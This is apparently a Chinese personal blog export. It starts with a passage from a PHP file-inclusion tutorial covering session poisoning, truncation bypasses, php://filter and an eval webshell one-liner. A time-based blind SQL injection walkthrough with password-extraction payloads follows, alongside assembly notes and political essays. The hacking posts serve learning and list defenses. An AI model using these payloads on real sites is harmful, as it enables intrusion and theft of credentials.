可以看到这个session.php文件中的用户会话信息username的值是用户可控制的，那我们就可以传入恶意代码进行攻击利用。<br>如果这里有注册功能，那么我们先注册一个用户<?php phpinfo();?>。然后用其登录：username&#x3D;<?php phpinfo();?>。等登陆成功后，记录下cookie中的PHPSESSID的值，这里为r7csmqpu1lul3elgsb6o9g6u1b。（经过测试不注册也行，输入一个不存在的用户名，登录失败也会生成session文件，那么直接不注册输入<?php phpinfo();?>登录也能生成，名称都为sess_cookie值）<br>我们这里以上帝视角来查看下session文件，可见恶意代码被写入了：<br><img src="/simg/File_include_4.png" alt=" "><br>将恶意代码传入以后，接下来就要利用文件包含漏洞去包含这个恶意代码。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fileinclude.php?file=D:\phpStudy\PHPTutorial\tmp\tmp\sess_r7csmqpu1lul3elgsb6o9g6u1b</span><br></pre></td></tr></table></figure>
<strong>注意命令执行和写入木马</strong>都是可以的，只要将上面的<?php phpinfo();?>替换成所对应的php代码，然后进行包含文件即可。</li>
</ul>
<p>今天写不动了，看看别人的博客吧，包含日志开始看。<br><a href="https://www.anquanke.com/post/id/248627#h3-7">php文件包含漏洞Getshell的不同姿势</a></p>
<h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><h2 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc = Off php版本&lt;5.3.4</span><br></pre></td></tr></table></figure>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span><br></pre></td></tr></table></figure>

<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><p>条件：<br>windows OS，点号需要长于256；linux OS 长于4096</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows下目录最大长度为256字节，超出的部分会被丢弃；</span><br><span class="line">Linux下目录最大长度为4096字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan><br></pre></td></tr></table></figure>

<h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>条件：<br>windows OS，点号需要长于256<br>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/FI.php</span><br><span class="line">?filename=test.txtspan><br></pre></td></tr></table></figure>


<h2 id="有限制远程文件包含漏洞绕过"><a href="#有限制远程文件包含漏洞绕过" class="headerlink" title="有限制远程文件包含漏洞绕过"></a>有限制远程文件包含漏洞绕过</h2><p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>] . <span class="string">&quot;.html&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。</p>
<h3 id="问号绕过"><a href="#问号绕过" class="headerlink" title="问号绕过"></a>问号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</span><br></pre></td></tr></table></figure>

<h3 id="号绕过"><a href="#号绕过" class="headerlink" title="#号绕过"></a>#号绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</span><br></pre></td></tr></table></figure>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</span><br></pre></td></tr></table></figure>


<h1 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h1><h2 id="读写敏感文件"><a href="#读写敏感文件" class="headerlink" title="读写敏感文件"></a>读写敏感文件</h2><p>我们可以利用文件包含漏洞读取任意文件，读取文件的时候有利用条件</p>
<ul>
<li>目标主机文件还在(目标文件的路径，绝对路径，相对路径)</li>
<li>具有文件可读权限<br>读取本地host文件：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=c:/windows/System32/drivers/etc/hosts</span><br><span class="line">?path=../../../../../../../../windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="直接包含图片木马"><a href="#直接包含图片木马" class="headerlink" title="直接包含图片木马"></a>直接包含图片木马</h2><p>可以利用包含漏洞直接包含图片木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=./timg_.jpg</span><br></pre></td></tr></table></figure>
<p>使用蚁剑连接</p>
<h2 id="包含木马写shell"><a href="#包含木马写shell" class="headerlink" title="包含木马写shell"></a>包含木马写shell</h2><p>我们也可以将如下代码写入到图片中，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval(\$_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;);?&gt;</span><br><span class="line">该段代码的含义是，在当前目录下创建一个名为shell.php文件，内容为&lt;?php phpinfo();?&gt; 当我们直接包含图片时，这段代码就会被执行</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–访问本地文件"><a href="#PHP-封装协议–访问本地文件" class="headerlink" title="PHP 封装协议–访问本地文件"></a>PHP 封装协议–访问本地文件</h2><p>我们可以使用php的file协议访问本地系统文件，提交参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=file://c:/windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–传输PHP文件"><a href="#PHP-封装协议–传输PHP文件" class="headerlink" title="PHP 封装协议–传输PHP文件"></a>PHP 封装协议–传输PHP文件</h2><p>可以使用以下参数来传输任意PHP文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?path=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<h2 id="PHP-封装协议–执行PHP命令"><a href="#PHP-封装协议–执行PHP命令" class="headerlink" title="PHP 封装协议–执行PHP命令"></a>PHP 封装协议–执行PHP命令</h2><p>我们可以利用PHP的封装协议来执行PHP命令。</p>
<h1 id="防御思路"><a href="#防御思路" class="headerlink" title="防御思路"></a>防御思路</h1><ol>
<li>无需情况下设置(在php.ini文件中)allow_url_include和allow_url_fopen为关闭，或者最小权限化</li>
<li>对可以包含的文件进行限制，可以使用白名单的方式，或者设置可以包含的目录，如open_basedir</li>
<li>尽量不使用动态包含</li>
<li>严格检查变量是否已经初始化。</li>
<li>严格检查输入的地址，不允许出现目录跳转符。尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现..&#x2F;之类的目录跳转符。</li>
<li>严格检查include类的文件包含函数中的参数是否外界可控。</li>
<li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li>
<li>在发布应用程序之前测试所有已知的威胁。</li>
</ol>
<ul>
<li>使用str_replace等方法过滤特殊字符，比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.  /  \  input  output  filter 等等</span><br></pre></td></tr></table></figure></li>
<li>指定包含的文件 （白名单）<br>我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出。</li>
<li>文件目录<br>php的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一个漏洞其实学得有点迷糊，主要是在包含方式那里。慢慢来吧，一回生二回熟。</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>有关与无关：中国人的误区</title>
    <url>/2023/02/28/%E6%9C%89%E5%85%B3%E4%B8%8E%E6%97%A0%E5%85%B3%EF%BC%9A%E4%B8%AD%E5%9B%BD%E4%BA%BA%E7%9A%84%E8%AF%AF%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>总要夜深人静之时才有想写的欲望。</p>
<span id="more"></span>

<h1 id="联系的强与弱"><a href="#联系的强与弱" class="headerlink" title="联系的强与弱"></a>联系的强与弱</h1><p>一个人与任何一件事物之间，有关是绝对的，无关是相对的。大到宇宙，小到个人。<br>只不过，通常来说，在地球上离我们越远的事物关联越少。离我们越近的事物关联越大。很多时候，人们对稍微离自己远一点的东西，就会说与我无关。确切地说，并非无关，而是联系比较微弱，在权衡利弊得失后放弃了花精力去处理这段关系。<br>俗话说，压死骆驼的最后一根稻草。微弱的联系大多时候不会表现出什么，但积蓄到一定程度也可能量变引起质变。当然我也不是说因为万物皆有联系所以什么都要关注，眼观六路耳听八方。那肯定不至于，人的精力是有限的，一般而言，肯定要先把精力集中在重要的事物上，有余力再去关注次要的事物。</p>
<h1 id="大多数中国人认为无关的问题–税"><a href="#大多数中国人认为无关的问题–税" class="headerlink" title="大多数中国人认为无关的问题–税"></a>大多数中国人认为无关的问题–税</h1><p>在中国聊起税，很多人都不怎么当回事儿，仿佛这种事同自己毫无关联。而实际上自己只要在中国有消费有收入，都是交了税的。我们极端一点，用暴力计算法，假如按税占消费收入的8%，假如从出生到18岁成年，消费在自己身上的有一百万，那么有8万都是被政府拿走了。<br>8万块钱，如果是被偷被骗意外损失了之类的，那么很可能会难过愤怒好一阵子。可是，当这笔钱被政府十多年来一点点偷偷拿走，很多人却没有任何感觉。这不是很讽刺吗？<br>或许有人会觉得，啊，取之于民，用之于民。收了税给人民带来福利，什么医保社保，什么基建工程，什么补贴政策等等。说白了只是政府把人民的钱汇聚起来办大工程，人民个人力量无法做到的事，由政府作为中间人去组织协商解决，政府本身并不产生任何资金效益，一切的钱财都来源于人民。<br>这一切看似都很美好，实则不然。有人做过一个统计，中国的福利待遇仅有8%，就按上面的8万计算，7万多的钱都不翼而飞了，这些钱都进了不同人的腰包里。算是人民孝敬“老爷”了<br>之前身边一人，我同对方说某某乌纱帽每年用十亿花天酒地。对方却不以为然，说这和我们有什么关系呢？我听后其实心里还是蛮诧异的，这怎么会没关系，自己交的税被别人随意拿来买奢侈品、保时捷之类的。难道不感到气愤吗？举个简单例子，我毫无理由直接叫你拿500给我买件衣服，会同意吗？那只要不是亲属绝大多数都不会吧。具有此等常识的我们却能纵容那些与我们素不相识的陌生人随意地花我们自己的钱，这逻辑不奇怪吗？<br>或许有人说，一个平民百姓，能有什么办法呢？的确，我们短期内做不到什么实质性的报复打击之类的。可这是我们毫无感触的理由吗？国外平民有一个常用来自称的词叫做纳税人，不过中国人却不怎么会意识到这一点，自己常常缴税，不是国家的主人，反而同奴隶孙子般窝囊，也实在悲哀。</p>
<h1 id="大多数中国人认为无关的事–政治"><a href="#大多数中国人认为无关的事–政治" class="headerlink" title="大多数中国人认为无关的事–政治"></a>大多数中国人认为无关的事–政治</h1><p>很多人不喜欢政治，这是正常的事。但因认为政治与自己无关，那是认知狭隘或愚昧浅薄。<br>恰恰相反，政治与每个人息息相关，可谓是非常重要，不喜欢政治可以，很正常。但不关注政治只能说明对政治的认识程度恐怕仅仅是停留在政客勾心斗角那一套等等。<br>政治代表了一个国家运作的逻辑与方向，无论什么方向，在中国各行各业各个领域应有具有。上海交大高校的党委书记是副部级，大一点的企业也设有党支部。比如，前两年曾发布过一个“双减政策”。这个政策一出顿时炸开了锅，大多数人都是看热闹，事不关己高高挂起。毕竟自认为与己无关嘛。但事实上，这怎么可能无关呢？培训机构，那要赔本儿了。教师群体，钱要少赚了。学生群体，提成绩更难了。家长群体，补习花费更多了。与广泛民众有着重要关联，可见政治重要性。<br>无论身处哪个国家，关注政治必不可少。不理解国家运行的逻辑和方向，就不可能从全面的角度看待一个国家。那也永远只能身处井底，看到片面的天空。</p>
<h1 id="大多数中国人认为有关的事–国外"><a href="#大多数中国人认为有关的事–国外" class="headerlink" title="大多数中国人认为有关的事–国外"></a>大多数中国人认为有关的事–国外</h1><p>一听到美国爆出了什么新闻，那顿时炸开了锅。是国外的负面事件即欢欣鼓舞，是国外的正向事件即唏嘘不已。<br>其实我真不明白，一天天关注国外的事干什么？自己哪国人，不应当首先关注了解自己国家的正面负面消息吗？其它国家出了什么事，甭管好坏，难道这个关联程度还能比自己国家的更大？也不会真有人觉得自己国家的破事儿比其它国家少吧。舍近求远，舍本逐末，乃是愚蠢表现。<br>至于当自己国家曝出什么负面消息时，民众言论带着“其它国家也这样啊”这种话的人，我想说，国家是拿来比烂的吗？不想着怎么更好，反而是互相比烂，觉得做得不错啦，有些事情是无法避免的……抱着这些想法的人，我个人是坚决反对的。<br>当然，人微言轻，改变一个人很难，也不是教育家，只是想写下来，坚定自己的观点与看法罢了。</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
      </tags>
  </entry>
  <entry>
    <title>时间盲注</title>
    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
<span id="more"></span>

<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>

<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
<li><p>判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断数据库字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>取数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
</ol>
<p>说明：建议写脚本，脚本有机会以后添加</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
</ul>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>时间盲注</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言期末复习</title>
    <url>/2022/12/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>烦内！一到期末就不想复习了，真是的。<br>还是要强迫自己学习哇。</p>
<span id="more"></span>
<h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="源码、反码、补码、移码之间的转换"><a href="#源码、反码、补码、移码之间的转换" class="headerlink" title="源码、反码、补码、移码之间的转换"></a>源码、反码、补码、移码之间的转换</h2><p>源码为正数时，<br>源码&#x3D;反码&#x3D;补码，移码&#x3D;补码+127<br>源码为负数时，<br>反码：符号位不变，其它位取反<br>补码：反码+1<br>移码：补码符号位取反</p>
<h2 id="有符号字节-amp-字"><a href="#有符号字节-amp-字" class="headerlink" title="有符号字节 &amp; 字"></a>有符号字节 &amp; 字</h2><ul>
<li>有符号字节<br>数值范围：-128<del>127或-2^7</del>2^7-1</li>
<li>有符号字<br>数值范围：-32768<del>32767或-2^15</del>2^15-1</li>
</ul>
<h2 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h2><p>计算机采用字符集的方式表示字符。<br>所谓字符集，就是一张映射表，用哪个数字表示哪个符号<br>常用字符集有：ASCII，ANSI，Unicode，GB2312，UTF-8</p>
<h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ol>
<li>保护模式。处理器的基本模式，所有指令和特性均相同，程序具备独立的内存段，地址线32位，4GB地址空间。</li>
<li>虚拟8086模式。是保护模式的一个特例，处理器可以安全地在多任务系统中执行实地址模式的软件，而不会影响其它运行的程序，地址线20位，1MB地址空间。</li>
<li>实地址模式。具有基本x86处理器环境和一些新增的特性，能够直接访问内存和硬件资源，地址线20位，1MB地址空间。</li>
<li>系统管理模式。实现电源管理和系统安全等。</li>
</ol>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p><img src="/simg/Assembly_1.png" alt="通用寄存器"></p>
<h2 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h2><p>进位标志位(CF)，与目标位置相比，无符号算数运算结果太大时，设置该标志位。<br>溢出标志位(OF)，与目标位置相比，有符号算术运算符太大或太小时，设置该标志位。</p>
<p>完全不想写了…</p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈爱国</title>
    <url>/2022/11/26/%E6%B5%85%E8%B0%88%E7%88%B1%E5%9B%BD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>爱国，似乎是一个不具有讨论性的话题。可能随便在街上问一个人，爱不爱国？恐怕都会答曰：爱国。<br>我仍然想讨论这个话题。</p>
<span id="more"></span>


<h1 id="爱国之问"><a href="#爱国之问" class="headerlink" title="爱国之问"></a>爱国之问</h1><p>为什么要爱国呢？是因为享受了国家的福祉而感恩？是因为为了更好的利益？是因为要政府的管理而顺从？还是因为寻求一种归属感？<br>爱国，到底是爱什么？是爱国家里的江山？人民？文化？政府？抑或皆有之。<br>要了解这些，首先需要知道，国家的性质有些什么。我查了下资料，大致上有这些：领土，政府，主权，人民，文化。</p>
<h1 id="爱国的部分"><a href="#爱国的部分" class="headerlink" title="爱国的部分"></a>爱国的部分</h1><p>既然要爱国，那这些也必定应当爱吧。领土和主权自不必谈，这里主要谈三个部分。</p>
<h2 id="政府"><a href="#政府" class="headerlink" title="政府"></a>政府</h2><p>政府（英语：Government）是一个政治体系，于某个区域订立、执行法律和管理的一套机构。<br>作为统治人民的机构，它做出对人民有利的事是应当的。因为政府在天然上占据了大量的优势，资源，信息都远超一般人民。倘若只占据好处而无所作为，那政府只是某些人用来谋取利益权势的工具。<br><font color=DarkRed>至于人民是否感谢政府，应当取决于人民自身的意愿，而不该带有强制要求去试图取代人民的感受。比如由政府带头大力宣传应当感激它自身，那恐怕只是一种政治目的或洗脑方式，必须要警惕。</font><br>爱国必然爱政府，当然爱是自由的，或许有的人能找到各种各样的理由爱政府，那没关系，我并不反对。<font color=DarkOliveGreen>只是有一点我必须要提出，爱必须要在了解的前提下才能谈。既然爱政府，那当然应该了解自己所在政府做了些什么事，尤其是对于擅长隐瞒事实的政府。只有在了解好坏并且接受之后，才能理直气壮地说自己爱政府。否则，我认为那只是一种偏见。如果连了解都不愿意真相都不接受，那只是愚蠢无知，没有谈下去的必要。</font></p>
<h2 id="人民"><a href="#人民" class="headerlink" title="人民"></a>人民</h2><p>人民（英语：People），又译居民、住民、国民，是个人（Person）的复数形集合。<br>国家里的人民，是整个人类的一部分，如果爱人类，那必然也爱人民。当然爱人民不代表爱人类。可一个声称自己爱国的人，会爱人民吗？我对此表示怀疑。当国民遭遇不幸时，是否会感到由衷地悲伤，还是说与我无关，抱着多一事不如少一事的心态。当国民在国际上取得名声时，是否会感到由衷地自豪，还是说无动于衷或是不屑一顾。爱国必然爱人民，如果做不到以上的事，那就不可能是爱人民。不仅如此，居庙堂而为非作歹，有余力却不愿施予。那更是与爱字沾不到边。<br><font color=darkblue>爱，是需要付出心力的，绝不是一句口号，一朝一夕之间的事。</font></p>
<h2 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h2><p>文化（英语：culture）是一群共同生活在相同自然环境及经济生产方式的人所形成的一种约定俗成潜意识的外在表现。其中之一的意义是“相互通过学习人类思想与行为的精华来达到完美”；广义的文化包括文字、语言、建筑、饮食、工具、技能、技术、知识、习俗、艺术等。<br>文化非常宽泛，如今有着各种各样的文化，这是特定团体的特色产物。而国家的文化与国家大小人民历史等方面都有着密不可分的联系。<br>每个国家都有自己的文化，或许有的在慢慢衰落，有的在逐渐兴起。可无论如何，只要不是糟粕的那一部分文化，都是值得尊重的。<br>一些所谓的爱国者常常喜欢谈论文化入侵，借此排挤他国文化。<font color=brown>我实在是觉得非常搞笑。首先文化入侵是国家与国家之间才考虑的事，个体喜欢什么是自身的自由。然后，一谈到文化入侵，马上想到的是怎么排挤，而不是怎么更好发展自己国家的文化，自欺欺人。不去想如何竞争，只会发动权力去打压，很低级也很蠢。</font><br>怎样体现出爱文化，其实是一件非常困难的事。因为爱文化不代表不能接受其它国家的文化，爱文化也不代表对自己国家的每种文化都全盘接受。我想，只要对自己国家的好的文化，即便不理解，保持着敬意，带着尊重的心，那便是爱文化。</p>
<h1 id="爱的高下"><a href="#爱的高下" class="headerlink" title="爱的高下"></a>爱的高下</h1><p>在讨论完爱国至少需要爱哪些部分后，接下来便是爱的高下。<br>当国家主动发起战争时，一个爱国的人，他是应当支持还是反对呢？或许有的人会犹豫，但我认为答案很明确，那便是反对。<br>首先，爱国不代表毫无底线。战争是国家之间最糟糕的行为，完全地反人类。难道说因为爱国而杀人就是正确的？可笑之极。<br>其次，爱国应当指出错误而不是容忍。就如一个孩子的成长过程中犯了错，作为父母是应当无所谓，等待酿下大错；还是及时教育避免重复出错呢？答案很明显吧。<br>因此，当一个国家做了错误的事，批判才是正确的行为。而非常可笑的是，有相当多所谓的爱国人士，只会包庇纵容。在我看来，这根本是虚伪的爱国。<br><font color=blue>对人类而言，首先是做人，然后再谈爱国。</font>就像逻辑推理，先有大前提才有小前提。违背良心与道德底线，是违背人的标准。人类都不复存在了更何况国家之事。<br>常常有人说，爱它就去改变它，对它不满就去改变它。可我想说如果一个国家烂到根里了，无论园丁怎么修剪枝叶，无论施加多少肥料，也是毫无意义。满腔热血终会被凉水泼冷，怂恿下火海终将万劫不复，爱国是否值得也有待商榷。<br>小家与大家之间的冲突问题。的确，古人云，皮之不存毛将焉附，覆巢之下安有完卵。面对外敌入侵，人民把国家放在第一位并没有问题。<br>没有外敌入侵时，国家做了不合理的措施，让人民来承担过失，我是坚决不同意的。捍卫自己与自己周边的利益，即便是国家也不能退让。<br><font color=red>做公民，不要做奴隶。<br></font></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单地讨论了以上几点后，我想，可以过滤掉一大部分自称的“爱国人士”。<br>爱国也并非总是位居最高位，当国家的所作所为违背了人类的基本准则，那是应当反对的。<br>当国家的所作所为侵害了个人权益，即便是国家也不应让步（仅限于能够抗议的政府，独裁政府不在此列，保护自身及周边人安全最重要）。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实想写这么一篇文章，是因周围有人宣称自己爱国，我便思考什么是爱国，算是临时想的，写得并不算好，我自己也不太满意。以后有新的思考再补充吧，权当留个引子。</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>爱国</tag>
      </tags>
  </entry>
  <entry>
    <title>浮</title>
    <url>/2023/03/09/%E6%B5%AE/</url>
    <content><![CDATA[<p><img src="/images/RainGlass.png" alt="Rain"></p>
<span id="more"></span>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>“浮”是一种糟糕的人生状态，绝大多数人或多或少都有过这种状态，只不过有的人天生不是浮在水面的生物，只是暂居水面。有的人一辈子只能浮在水面上，无论他甘心与否。</p>
<h1 id="说文解字"><a href="#说文解字" class="headerlink" title="说文解字"></a>说文解字</h1><p>首先看，浮这个字，可以组成的词有：浮躁、浮萍、浮夸、浮生、浮华等等，虽然也有少量中性或是褒义的词，但大多数还是贬义的形容。然后，“浮”对于不会游泳的生物而言是一个危险的词，因为当不会游泳的生物在没有外力的作用下，浮在水面上通常是由于死亡，此外鱼儿在死亡后也会浮在水面上。最后，我认为“浮”从抽象意义上表现一个人既不能自由地翱翔在天空中，上九天揽月；也不能漫步水底，下五洋捉鳖。“浮”带给我的始终是不上不下，高不成低不就的一种感觉。“浮”这个字从我的角度来看，它代表了一种不稳定、不安全、不满足、缺乏主动性和责任感的状态，可能会让一个人感到烦躁、迷茫、空虚。</p>
